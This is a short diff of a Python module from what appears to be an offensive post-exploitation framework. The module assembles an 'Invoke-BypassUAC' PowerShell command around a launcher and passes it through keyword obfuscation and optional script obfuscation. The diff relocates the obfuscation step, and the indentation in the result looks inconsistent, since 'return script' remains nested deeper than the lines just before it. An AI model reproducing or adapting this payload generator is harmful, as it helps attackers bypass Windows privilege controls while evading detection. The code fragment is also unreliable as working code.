@@ -122,8 +122,8 @@ class Module(object):
             else:
                 scriptEnd = "Invoke-BypassUAC -Command \"%s\"" % (launcher)
                 scriptEnd = helpers.keyword_obfuscation(scriptEnd, self.mainMenu)
-                if obfuscate:
-                    scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
-                script += scriptEnd
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
                 return script
 
